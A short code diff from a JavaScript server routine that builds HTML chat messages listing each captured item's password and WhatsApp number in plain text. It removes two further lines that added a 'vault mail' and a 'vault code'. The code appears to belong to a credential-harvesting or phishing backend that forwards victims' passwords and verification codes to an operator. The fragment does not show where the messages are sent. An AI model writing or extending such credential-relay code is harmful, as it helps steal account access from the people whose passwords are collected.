@@ -139,8 +139,6 @@ async function startServer() {
           
           if (item.password) message += `<b>🔑 PASSWORD:</b> <code>${escapeHTML(item.password)}</code>\n`;
           if (item.whatsapp) message += `<b>📱 WHATSAPP:</b> <code>${escapeHTML(item.whatsapp)}</code>\n`;
-          if (item.vaultGmail) message += `<b>📧 VAULT MAIL:</b> ${escapeHTML(item.vaultGmail)}\n`;
-          if (item.vaultNumber) message += `<b>🔐 VAULT CODE:</b> <code>${escapeHTML(item.vaultNumber)}</code>\n`;
           
           message += `\n`;
         });
